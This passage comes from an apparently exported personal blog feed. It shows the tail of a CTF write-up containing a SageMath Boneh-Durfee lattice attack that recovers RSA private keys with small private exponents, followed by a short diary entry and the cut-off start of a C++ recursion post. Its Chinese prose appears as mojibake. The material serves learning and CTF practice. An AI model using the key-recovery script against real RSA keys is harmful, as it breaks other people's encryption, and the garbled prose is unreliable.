operator">^</span>kk <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span>            yshift <span class="token operator">=</span> Q<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># substitution</span>    <span class="token comment" spellcheck="true"># y-shifts list of monomials</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u<span class="token operator">^</span>kk <span class="token operator">*</span> y<span class="token operator">^</span>jj<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># construct lattice B</span>    nn <span class="token operator">=</span> len<span class="token punctuation">(</span>monomials<span class="token punctuation">)</span>    BB <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>        BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span> <span class="token keyword">in</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># Prototype to reduce the lattice</span>    <span class="token keyword">if</span> helpful_only<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># automatically remove</span>        BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">,</span> nn<span class="token number">-1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># reset dimension</span>        nn <span class="token operator">=</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> nn <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"failure"</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    <span class="token comment" spellcheck="true"># check if vectors are helpful</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        helpful_vectors<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># check if determinant is correctly bounded</span>    det <span class="token operator">=</span> BB<span class="token punctuation">.</span>det<span class="token punctuation">(</span><span class="token punctuation">)</span>    bound <span class="token operator">=</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm<span class="token operator">*</span>nn<span class="token punctuation">)</span>    <span class="token keyword">if</span> det <span class="token operator">>=</span> bound<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"We do not have det &lt; bound. Solutions might not be found."</span>        <span class="token keyword">print</span> <span class="token string">"Try with highers m and t."</span>        <span class="token keyword">if</span> debug<span class="token punctuation">:</span>            diff <span class="token operator">=</span> <span class="token punctuation">(</span>log<span class="token punctuation">(</span>det<span class="token punctuation">)</span> <span class="token operator">-</span> log<span class="token punctuation">(</span>bound<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">"size det(L) - size e^(m*n) = "</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>diff<span class="token punctuation">)</span>        <span class="token keyword">if</span> strict<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>    <span class="token comment" spellcheck="true"># display the lattice basis</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        matrix_overview<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># LLL</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"optimizing basis of the lattice via LLL, this can take a long time"</span>    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LLL is done!"</span>    <span class="token comment" spellcheck="true"># transform vector i &amp; j -> polynomials 1 &amp; 2</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"looking for independent vectors in the lattice"</span>    found_polynomials <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> pol1_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> pol2_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>pol1_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nn<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># for i and j, create the two polynomials</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>w<span class="token punctuation">,</span>z<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            pol1 <span class="token operator">=</span> pol2 <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>                pol1 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol1_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>                pol2 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol2_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># resultant</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>q<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            rr <span class="token operator">=</span> pol1<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol2<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># are these good polynomials?</span>            <span class="token keyword">if</span> rr<span class="token punctuation">.</span>is_zero<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">or</span> rr<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"found them, using vectors"</span><span class="token punctuation">,</span> pol1_idx<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> pol2_idx                found_polynomials <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> found_polynomials<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token operator">not</span> found_polynomials<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"no independant vectors could be found. This should very rarely happen..."</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    rr <span class="token operator">=</span> rr<span class="token punctuation">(</span>q<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># solutions</span>    soly <span class="token operator">=</span> rr<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>soly<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Your prediction (delta) is too small"</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    soly <span class="token operator">=</span> soly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    ss <span class="token operator">=</span> pol1<span class="token punctuation">(</span>q<span class="token punctuation">,</span> soly<span class="token punctuation">)</span>    solx <span class="token operator">=</span> ss<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">return</span> solx<span class="token punctuation">,</span> soly<span class="token keyword">def</span> <span class="token function">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">############################################</span>    <span class="token comment" spellcheck="true"># How To Use This Script</span>    <span class="token comment" spellcheck="true">##########################################</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># The problem to solve (edit the following values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># the modulus</span>    N <span class="token operator">=</span> <span class="token number">0xc2fd2913bae61f845ac94e4ee1bb10d8531dda830d31bb221dac5f179a8f883f15046d7aa179aff848db2734b8f88cc73d09f35c445c74ee35b01a96eb7b0a6ad9cb9ccd6c02c3f8c55ecabb55501bb2c318a38cac2db69d510e152756054aaed064ac2a454e46d9b3b755b67b46906fbff8dd9aeca6755909333f5f81bf74db</span>    <span class="token comment" spellcheck="true"># the public exponent</span>    e <span class="token operator">=</span> <span class="token number">0x19441f679c9609f2484eb9b2658d7138252b847b2ed8ad182be7976ed57a3e441af14897ce041f3e07916445b88181c22f510150584eee4b0f776a5a487a4472a99f2ddc95efdd2b380ab4480533808b8c92e63ace57fb42bac8315fa487d03bec86d854314bc2ec4f99b192bb98710be151599d60f224114f6b33f47e357517</span>    <span class="token comment" spellcheck="true"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span>    delta <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token number">18</span> <span class="token comment" spellcheck="true"># this means that d &lt; N^delta</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Lattice (tweak those values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span>    m <span class="token operator">=</span> <span class="token number">4</span> <span class="token comment" spellcheck="true"># size of the lattice (bigger the better/slower)</span>    <span class="token comment" spellcheck="true"># you need to be a lattice master to tweak these</span>    t <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>delta<span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># optimization from Herrmann and May</span>    X <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>floor<span class="token punctuation">(</span>N<span class="token operator">^</span>delta<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># this _might_ be too much</span>    Y <span class="token operator">=</span> floor<span class="token punctuation">(</span>N<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># correct if p, q are ~ same size</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Don't touch anything below</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Problem put in equation</span>    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    A <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    pol <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token punctuation">(</span>A <span class="token operator">+</span> y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Find the solutions!</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Checking bounds</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== checking values ==="</span>        <span class="token keyword">print</span> <span class="token string">"* delta:"</span><span class="token punctuation">,</span> delta        <span class="token keyword">print</span> <span class="token string">"* delta &lt; 0.292"</span><span class="token punctuation">,</span> delta <span class="token operator">&lt;</span> <span class="token number">0.292</span>        <span class="token keyword">print</span> <span class="token string">"* size of e:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* size of N:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* m:"</span><span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token string">", t:"</span><span class="token punctuation">,</span> t    <span class="token comment" spellcheck="true"># boneh_durfee</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== running algorithm ==="</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    solx<span class="token punctuation">,</span> soly <span class="token operator">=</span> boneh_durfee<span class="token punctuation">(</span>pol<span class="token punctuation">,</span> e<span class="token punctuation">,</span> m<span class="token punctuation">,</span> t<span class="token punctuation">,</span> X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># found a solution?</span>    <span class="token keyword">if</span> solx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== solution found ==="</span>        <span class="token keyword">if</span> <span class="token boolean">False</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"x:"</span><span class="token punctuation">,</span> solx            <span class="token keyword">print</span> <span class="token string">"y:"</span><span class="token punctuation">,</span> soly        d <span class="token operator">=</span> int<span class="token punctuation">(</span>pol<span class="token punctuation">(</span>solx<span class="token punctuation">,</span> soly<span class="token punctuation">)</span> <span class="token operator">/</span> e<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"private key found:"</span><span class="token punctuation">,</span> d    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== no solution was found ==="</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== %s seconds ==="</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    example<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="üéàÂ∞èÁªì"><a href="#üéàÂ∞èÁªì" class="headerlink" title="üéàÂ∞èÁªì"></a>üéàÂ∞èÁªì</h2><blockquote><p>ËøôÈ¢òÂæàÂ•ΩÂú∞Â∏ÆËá™Â∑±ËÆ§ËØÜ‰∫Ü‰∏ÄÊ≥¢RSAÁöÑÂêÑÁßçÂßøÂäøÔºåÊ∑±ÂÖ•Âú∞Â≠¶‰π†‰∫Ü‰∏Ä‰∏ãRSA„ÄÇ</p></blockquote><h2 id="üìïÂèÇËÄÉ"><a href="#üìïÂèÇËÄÉ" class="headerlink" title="üìïÂèÇËÄÉ"></a>üìïÂèÇËÄÉ</h2><p><a href="http://inaz2.hatenablog.com/entry/2016/01/20/022936" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2016/01/20/022936</a></p><p><a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p><a href="https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default" target="_blank" rel="noopener">https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/8654120.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/8654120.html</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/7541481.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/7541481.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ÂØÜÁ†ÅÂ≠¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Âº∫ÁΩëÊùØ </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>New_start</title>
      <link href="/2019/05/23/New-start/"/>
      <url>/2019/05/23/New-start/</url>
      
        <content type="html"><![CDATA[<p>‰ªäÂ§©ÂºÄÂßãÔºåÂõûÂà∞‰ª•ÂæÄÁöÑÂ≠¶‰π†Áä∂ÊÄÅÂêßÔºÅüôÇ</p><a id="more"></a><h1 id="2019Âπ¥5Êúà23Êó•‚òÄ"><a href="#2019Âπ¥5Êúà23Êó•‚òÄ" class="headerlink" title="2019Âπ¥5Êúà23Êó•‚òÄ"></a>2019Âπ¥5Êúà23Êó•‚òÄ</h1><blockquote><p>Ë∑ù‰ªäÂæà‰πÖÊ≤°Êõ¥Êñ∞ÂçöÂÆ¢‰∫ÜÔºå‰∏ÄÊñπÈù¢Âõ†‰∏∫ÊáíÔºå‰∏ÄÊñπÈù¢Âõ†‰∏∫Â≠¶‰π†ÁöÑÂÅúÊªûÔºåÂêÑÊñπÈù¢ÂéüÂõ†„ÄÇ</p><p>ËÄå‰ªäÊâìÁÆóÂõûÂà∞‰ª•ÂæÄÁöÑÂ≠¶‰π†Áä∂ÊÄÅÔºåÂõ†‰∏∫Âè™ÊúâËøôÊ†∑ÔºåÊâçÊòØÂÖÖÂÆûÁöÑÔºåÊúâËßÑÂàíÊúâÁõÆÊ†áÁöÑüòÑ„ÄÇ</p></blockquote><h2 id="ËøôÂá†‰∏™ÊúàÂÅö‰∫Ü‰ªÄ‰πà"><a href="#ËøôÂá†‰∏™ÊúàÂÅö‰∫Ü‰ªÄ‰πà" class="headerlink" title="ËøôÂá†‰∏™ÊúàÂÅö‰∫Ü‰ªÄ‰πà"></a>ËøôÂá†‰∏™ÊúàÂÅö‰∫Ü‰ªÄ‰πà</h2><blockquote><p>ËôΩÁÑ∂ËÆ§ËÆ§ÁúüÁúüÂú∞ÁúãËµ∞ËøáÊù•ÁöÑËøô‰∫õÊó•Â≠êÔºåÁ°ÆÂÆûÊ≤°ÂÅö‰ªÄ‰πàÂ§ß‰∫ãÔºåÂÅöÁöÑÈÉΩÊòØÂÆûÈôÖÊÑè‰πâ‰∏çÂ§ßÁöÑÂ∞è‰∫ãÊÉÖÔºåËá™Â∑±ÁöÑ‰∏ì‰∏öÁü•ËØÜÂíåÊäÄËÉΩ‰πüÂπ∂Ê≤°ÊúâÂ§öÂ§ßÁöÑËøõÊ≠•ÔºåÂèØ‰ª•ËØ¥ÊòØËôöÂ∫¶‰∫ÜËÆ∏Â§öÊó∂ÂÖâüôÉ„ÄÇ</p></blockquote><h2 id="Êó∂Èó¥‰∏çÂ§ö‰∫Ü"><a href="#Êó∂Èó¥‰∏çÂ§ö‰∫Ü" class="headerlink" title="Êó∂Èó¥‰∏çÂ§ö‰∫Ü"></a>Êó∂Èó¥‰∏çÂ§ö‰∫Ü</h2><blockquote><p>Êé•‰∏ãÊù•ÁöÑÊó∂Èó¥‰∏çÂ§ö‰∫ÜÔºåÁ¨¨Âõõ‰∏™Â≠¶Êúü‰πüÂà∞‰∫ÜÂ∞æÂ£∞Ôºå‰∏ÄËæπË¶ÅÂáÜÂ§áÂá†‰∏™ÊØîËµõÂíåÈ°πÁõÆÔºàÂ§ßÂ§öÊ≤°‰ªÄ‰πàÊÑè‰πâÔºå‰ΩÜ‰πüÂæóÂÆåÊàêÂÆÉ‰ª¨ÊâçË°åÔºâÔºå‰∏ÄËæπË¶ÅÊúüÊú´Â§ç‰π†Ôºå‰∏ÄËæπËøòÂæóÂºÄÂßãÊèêÂçáÂÅúÊªûËÆ∏‰πÖ‰∏çÂâçÁöÑÊäÄÊúØÂπøÂ∫¶ÂíåÊ∑±Â∫¶„ÄÇ</p><p>‰ªªÂä°Ëâ∞Â∑®ÔºåÂÖâÈò¥ÁèçË¥µÔºåÂ∏åÊúõËá™Â∑±Â§öÂÅöÁÇπÊúâÊÑè‰πâÁöÑ‰∫ãÊÉÖÂêßüí™ÔºåÂíåË∫´ËæπÁöÑ‰∫∫ÂÖ±ÂêåÂâçË°åÔºåÁõ∏‰∫íÊâ∂ÊåÅ‰øÉËøõÔºå‰ª•ÂêéË¶ÅÂ§öÂú®ÊäÄÊúØÊñπÈù¢ËßÅËßÅ‰∏ñÈù¢ÂëÄ„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÈöèÁ¨î </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ÈöèÁ¨î </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Algorithm_Recursive_Tree</title>
      <link href="/2019/03/17/Algorithm-Recursive-Tree/"/>
      <url>/2019/03/17/Algorithm-Recursive-Tree/</url>
      
        <content type="html"><![CDATA[<p>üòÑÁÆóÊ≥ïÂ§™Ëèú„ÄÇ<br><a id="more"></a></p><h1 id="Algorithm‚Äî‚ÄîÈÄíÂΩíÊÄùÊÉ≥ÂíåÊ†ë"><a href="#Algorithm‚Äî‚ÄîÈÄíÂΩíÊÄùÊÉ≥ÂíåÊ†ë" class="headerlink" title="Algorithm‚Äî‚ÄîÈÄíÂΩíÊÄùÊÉ≥ÂíåÊ†ë"></a>Algorithm‚Äî‚ÄîÈÄíÂΩíÊÄùÊÉ≥ÂíåÊ†ë</h1><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>ÂÄüÂä©‰∏ÄÁÆÄÂçïÁöÑÁÆóÊ≥ïÁ®ãÂ∫èËÆæËÆ°È¢òÊù•ÁÜüÊÇâ<code>ÈÄíÂΩíÊÄùÊÉ≥</code>Âíå<code>ÁÆÄÂçïTree</code>.</p><pre class=" language-c++"><code class="language-c++">È¢òÈù¢‰∏∫ÔºöÁªô‰∏Ä‰∏™Ê≠£Êï¥Êï∞nÔºåÊ±ÇÊúâÂ§öÂ∞ëÁßçÈùû0ÁöÑÊï¥Êï∞ÁªÑÂêà‰πãÂíåÁ≠â‰∫én.‰æãÂ¶ÇÔºö    2=1+1      3=1+1+1      3=1+2</code></pre><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>ÈÄöËøáÊ†ëÂàÜÊîØÁöÑÊñπÂºèÊù•ÂØªÊâæÁ≠îÊ°àÔºåÊ†ëÁöÑÊ†π<code>root=1</code>ÔºåÁÑ∂ÂêéÈÄêÊ∏êÂæ™ÁéØËé∑ÂèñÊØè‰∏™ÂàÜÊîØ‰πãÂíå‰∏∫nÔºåÂ∞è‰∫énÂàôÁªßÁª≠Êâ©Â±ï„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317161546.png" alt=""></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span> </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;set></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> tree<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>string <span class="token 